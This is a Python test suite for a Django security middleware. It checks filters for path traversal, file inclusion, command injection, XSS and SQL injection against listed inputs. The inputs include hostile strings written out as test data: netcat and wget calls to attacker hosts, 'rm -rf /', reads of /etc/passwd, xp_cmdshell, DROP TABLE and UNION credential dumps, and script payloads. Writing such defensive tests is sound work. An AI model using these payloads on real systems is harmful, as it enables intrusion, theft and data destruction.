"""
Advanced Attack Protection Test Suite
Comprehensive testing for cyber security protections
"""

import logging
from django.test import TestCase, RequestFactory
from django.http import HttpRequest
from security_enhancements.advanced_attack_protection import (
    PathTraversalProtection,
    RemoteFileInclusionProtection,
    CommandInjectionProtection,
    XSSProtection,
    SQLInjectionProtection,
    AdvancedSecurityMiddleware
)

logger = logging.getLogger('security_enhancements')

class TestAdvancedAttackProtection:
    """Comprehensive test suite for advanced attack protections"""
    
    def __init__(self):
        self.request_factory = RequestFactory()
    
    def test_path_traversal_protection(self):
        """Test Path Traversal and Local File Inclusion protection"""
        print("\n🔍 Testing Path Traversal Protection...")
        
        # Test cases: (input, should_be_blocked)
        test_cases = [
            ("../etc/passwd", True),
            ("..\\windows\\system32\\config\\sam", True),
            ("%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", True),
            ("file:///etc/passwd", True),
            ("normal/path/file.txt", False),
            ("legitimate_file.pdf", False),
            ("/proc/version", True),
            ("boot.ini", True),
            ("web.config", True),
            (".htaccess", True),
            ("uploads/user_file.jpg", False)
        ]
        
        passed = 0
        failed = 0
        
        for test_input, should_block in test_cases:
            result = not PathTraversalProtection.validate_path(test_input)
            if result == should_block:
                status = "✅ PASS"
                passed += 1
            else:
                status = "❌ FAIL"
                failed += 1
            
            print(f"  {status} - '{test_input[:30]}...' - Expected: {'Block' if should_block else 'Allow'}")
        
        print(f"Path Traversal Tests: {passed} passed, {failed} failed")
        return failed == 0
    
    def test_remote_file_inclusion_protection(self):
        """Test Remote File Inclusion protection"""
        print("\n🔍 Testing Remote File Inclusion Protection...")
        
        test_cases = [
            ("http://malicious.com/shell.php", True),
            ("ftp://attacker.com/backdoor.asp", True),
            ("data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=", True),
            ("javascript:alert('xss')", True),
            ("php://filter/convert.base64-encode/resource=index.php", True),
            ("https://legitimate-site.com/api/data", False),
            ("uploads/document.pdf", False),
            ("http://192.168.1.1/admin", True),  # Private IP
            ("file:///etc/passwd", True),
            ("expect://ls", True)
        ]
        
        passed = 0
        failed = 0
        
        for test_input, should_block in test_cases:
            result = not RemoteFileInclusionProtection.validate_url(test_input)
            if result == should_block:
                status = "✅ PASS"
                passed += 1
            else:
                status = "❌ FAIL"
                failed += 1
            
            print(f"  {status} - '{test_input[:40]}...' - Expected: {'Block' if should_block else 'Allow'}")
        
        print(f"Remote File Inclusion Tests: {passed} passed, {failed} failed")
        return failed == 0
    
    def test_command_injection_protection(self):
        """Test Command Injection protection"""
        print("\n🔍 Testing Command Injection Protection...")
        
        test_cases = [
            ("user@example.com; cat /etc/passwd", True),
            ("filename && rm -rf /", True),
            ("data | nc attacker.com 4444", True),
            ("`whoami`", True),
            ("$(id)", True),
            ("user@example.com", False),
            ("normal text input", False),
            ("filename > /dev/null", True),
            ("input < /etc/hosts", True),
            ("curl http://malicious.com", True),
            ("wget http://attacker.com/shell", True),
            ("ping google.com", True),
            ("netstat -an", True),
            ("ps aux", True)
        ]
        
        passed = 0
        failed = 0
        
        for test_input, should_block in test_cases:
            result = not CommandInjectionProtection.validate_input(test_input)
            if result == should_block:
                status = "✅ PASS"
                passed += 1
            else:
                status = "❌ FAIL"
                failed += 1
            
            print(f"  {status} - '{test_input[:40]}...' - Expected: {'Block' if should_block else 'Allow'}")
        
        print(f"Command Injection Tests: {passed} passed, {failed} failed")
        return failed == 0
    
    def test_xss_protection(self):
        """Test Cross-Site Scripting protection"""
        print("\n🔍 Testing XSS Protection...")
        
        # Reflected XSS tests
        reflected_tests = [
            ("<script>alert('xss')</script>", True),
            ("<img src=x onerror=alert('xss')>", True),
            ("<iframe src=javascript:alert('xss')></iframe>", True),
            ("<svg onload=alert('xss')>", True),
            ("<body onload=alert('xss')>", True),
            ("javascript:alert('xss')", True),
            ("vbscript:alert('xss')", True),
            ("Hello World", False),
            ("<b>Bold Text</b>", False),
            ("user@example.com", False)
        ]
        
        # DOM XSS tests
        dom_tests = [
            ("document.write('<script>alert(1)</script>')", True),
            ("innerHTML = userInput", True),
            ("eval(userInput)", True),
            ("setTimeout('alert(1)', 100)", True),
            ("location = 'javascript:alert(1)'", True),
            ("window.open('malicious.com')", True),
            ("normal function call()", False),
            ("var x = 5", False)
        ]
        
        passed = 0
        failed = 0
        
        print("  Reflected XSS Tests:")
        for test_input, should_block in reflected_tests:
            result = not XSSProtection.validate_reflected_xss(test_input)
            if result == should_block:
                status = "✅ PASS"
                passed += 1
            else:
                status = "❌ FAIL"
                failed += 1
            
            print(f"    {status} - '{test_input[:40]}...' - Expected: {'Block' if should_block else 'Allow'}")
        
        print("  DOM XSS Tests:")
        for test_input, should_block in dom_tests:
            result = not XSSProtection.validate_dom_xss(test_input)
            if result == should_block:
                status = "✅ PASS"
                passed += 1
            else:
                status = "❌ FAIL"
                failed += 1
            
            print(f"    {status} - '{test_input[:40]}...' - Expected: {'Block' if should_block else 'Allow'}")
        
        print(f"XSS Protection Tests: {passed} passed, {failed} failed")
        return failed == 0
    
    def test_sql_injection_protection(self):
        """Test SQL Injection protection"""
        print("\n🔍 Testing SQL Injection Protection...")
        
        # Error-based SQL injection tests
        error_based_tests = [
            ("' OR '1'='1", True),
            ("admin'; DROP TABLE users; --", True),
            ("' UNION SELECT * FROM users --", True),
            ("1' AND (SELECT COUNT(*) FROM users) > 0 --", True),
            ("'; EXEC xp_cmdshell('dir'); --", True),
            ("normal@example.com", False),
            ("user123", False),
            ("search term", False)
        ]
        
        # UNION-based SQL injection tests
        union_based_tests = [
            ("' UNION ALL SELECT username,password FROM users --", True),
            ("1 UNION SELECT null,version(),null --", True),
            ("' UNION SELECT concat(username,':',password) FROM users --", True),
            ("' UNION SELECT group_concat(table_name) FROM information_schema.tables --", True),
            ("' UNION SELECT 0x48656c6c6f --", True),
            ("normal union meeting", False),
            ("select all items", False)
        ]
        
        # Time-based blind SQL injection tests
        time_based_tests = [
            ("'; WAITFOR DELAY '00:00:05' --", True),
            ("' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5) --", True),
            ("'; SELECT pg_sleep(5); --", True),
            ("1; BENCHMARK(5000000, MD5(1)); --", True),
            ("normal sleep function", False),
            ("wait for response", False)
        ]
        
        passed = 0
        failed = 0
        
        all_tests = [
            ("Error-based", error_based_tests),
            ("UNION-based", union_based_tests),
            ("Time-based", time_based_tests)
        ]
        
        for test_type, test_cases in all_tests:
            print(f"  {test_type} SQL Injection Tests:")
            
            for test_input, should_block in test_cases:
                if test_type == "Error-based":
                    result = not SQLInjectionProtection.validate_error_based(test_input)
                elif test_type == "UNION-based":
                    result = not SQLInjectionProtection.validate_union_based(test_input)
                else:  # Time-based
                    result = not SQLInjectionProtection.validate_time_based(test_input)
                
                if result == should_block:
                    status = "✅ PASS"
                    passed += 1
                else:
                    status = "❌ FAIL"
                    failed += 1
                
                print(f"    {status} - '{test_input[:40]}...' - Expected: {'Block' if should_block else 'Allow'}")
        
        print(f"SQL Injection Tests: {passed} passed, {failed} failed")
        return failed == 0
    
    def test_middleware_integration(self):
        """Test complete middleware integration"""
        print("\n🔍 Testing Middleware Integration...")
        
        middleware = AdvancedSecurityMiddleware(lambda r: None)
        passed = 0
        failed = 0
        
        # Test malicious GET request
        try:
            request = self.request_factory.get('/search/?q=<script>alert(1)</script>')
            middleware.process_request(request)
            print("  ❌ FAIL - Malicious GET request not blocked")
            failed += 1
        except Exception:
            print("  ✅ PASS - Malicious GET request blocked")
            passed += 1
        
        # Test malicious POST request
        try:
            request = self.request_factory.post('/submit/', {'data': "'; DROP TABLE users; --"})
            middleware.process_request(request)
            print("  ❌ FAIL - Malicious POST request not blocked")
            failed += 1
        except Exception:
            print("  ✅ PASS - Malicious POST request blocked")
            passed += 1
        
        # Test legitimate request
        try:
            request = self.request_factory.get('/search/?q=python+tutorial')
            result = middleware.process_request(request)
            if result is None:  # None means request passes through
                print("  ✅ PASS - Legitimate request allowed")
                passed += 1
            else:
                print("  ❌ FAIL - Legitimate request blocked")
                failed += 1
        except Exception:
            print("  ❌ FAIL - Legitimate request blocked with exception")
            failed += 1
        
        print(f"Middleware Integration Tests: {passed} passed, {failed} failed")
        return failed == 0
    
    def run_all_tests(self):
        """Run comprehensive test suite"""
        print("🔐 ADVANCED CYBER SECURITY PROTECTION TEST SUITE")
        print("=" * 60)
        
        test_results = []
        
        test_results.append(self.test_path_traversal_protection())
        test_results.append(self.test_remote_file_inclusion_protection())
        test_results.append(self.test_command_injection_protection())
        test_results.append(self.test_xss_protection())
        test_results.append(self.test_sql_injection_protection())
        test_results.append(self.test_middleware_integration())
        
        print("\n" + "=" * 60)
        print("🎯 TEST SUMMARY")
        print("=" * 60)
        
        protection_types = [
            "Path Traversal & LFI Protection",
            "Remote File Inclusion Protection",
            "Command Injection Protection", 
            "Cross-Site Scripting Protection",
            "SQL Injection Protection",
            "Middleware Integration"
        ]
        
        for i, (protection_type, passed) in enumerate(zip(protection_types, test_results)):
            status = "✅ PASSED" if passed else "❌ FAILED"
            print(f"{status} - {protection_type}")
        
        total_passed = sum(test_results)
        total_tests = len(test_results)
        
        print(f"\n📊 OVERALL RESULTS: {total_passed}/{total_tests} test suites passed")
        
        if total_passed == total_tests:
            print("🏆 ALL SECURITY PROTECTIONS ARE WORKING CORRECTLY!")
            return True
        else:
            print("⚠️  SOME SECURITY PROTECTIONS NEED ATTENTION!")
            return False


def run_security_tests():
    """Entry point for running security tests"""
    tester = TestAdvancedAttackProtection()
    return tester.run_all_tests()


if __name__ == "__main__":
    run_security_tests()